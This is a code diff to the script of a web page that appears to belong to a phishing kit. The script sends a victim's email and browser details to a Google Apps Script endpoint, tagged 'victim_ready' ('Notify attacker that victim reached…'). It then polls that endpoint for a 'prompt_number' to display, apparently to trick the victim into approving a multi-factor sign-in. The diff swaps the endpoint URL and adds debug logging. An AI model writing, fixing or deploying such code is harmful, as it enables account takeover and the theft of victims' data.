@@ -108,47 +108,60 @@
   </div>
 
   <script>
-    const email = localStorage.getItem("demoEmail") || "someone@example.com";
+    const email = (localStorage.getItem("demoEmail") || "someone@example.com").trim();
     const usernamePart = email.split('@')[0];
     document.getElementById("avatar").textContent = usernamePart.charAt(0).toUpperCase();
 
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxWcWRGh-MtprOPpjoHmaxDrVQRWPTEjWSNrjI1O_OZY4DF6aqui_sh9Eqv09bHJFgy/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxxwtqSxcM3xKDVY4vaXQ1E44cosqIVI9HM0guLL8GHe2hEV3S9EmQ1Pr46jzWZa9zS/exec";
 
-    // Notify attacker that victim reached loading/verify stage
     fetch(SCRIPT_URL, {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
       body: new URLSearchParams({
-        action: "victim_ready",           // ← change to "victim_at_verify" if your script uses that
+        action: "victim_ready",
         email: email,
         user_agent: navigator.userAgent,
         timestamp: new Date().toISOString()
       })
     })
     .then(r => r.json())
-    .then(data => console.log("Notify response:", data))
-    .catch(err => console.error("Notify failed:", err));
+    .then(d => console.log("Victim notify sent:", d))
+    .catch(e => console.error("Victim notify failed:", e));
 
-    // Poll for number
     const pollInterval = setInterval(async () => {
       try {
-        const response = await fetch(`${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}`);
-        const data = await response.json();
+        const pollUrl = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}`;
+        console.log("[POLL START] URL:", pollUrl);
+        console.log("[POLL] Email used:", email);
 
-        console.log("Poll result:", data); // ← for debugging
+        const response = await fetch(pollUrl);
+        const rawText = await response.text();
+        console.log("[POLL] Raw server response:", rawText);
 
-        if (data?.prompt_number?.trim()) {
+        let data;
+        try {
+          data = JSON.parse(rawText);
+          console.log("[POLL] Parsed data:", data);
+        } catch (parseErr) {
+          console.error("[POLL] JSON parse error:", parseErr, "Raw was:", rawText);
+          return;
+        }
+
+        const num = (data?.prompt_number || "").trim();
+        console.log("[POLL] Extracted number:", num || "(empty)");
+
+        if (num && num !== "" && num !== "—" && num !== "null") {
+          console.log("[SUCCESS] Number detected → switching display:", num);
           document.getElementById("loading").style.display = "none";
           document.getElementById("prompt-section").style.display = "block";
-          document.getElementById("matchNumber").textContent = data.prompt_number;
+          document.getElementById("matchNumber").textContent = num;
           clearInterval(pollInterval);
         }
       } catch (err) {
-        console.error("Poll error:", err);
+        console.error("[POLL ERROR]:", err);
       }
-    }, 3500);
+    }, 4000);
 
-    // Auto-redirect fallback
     setTimeout(() => {
       clearInterval(pollInterval);
       localStorage.removeItem("demoEmail");
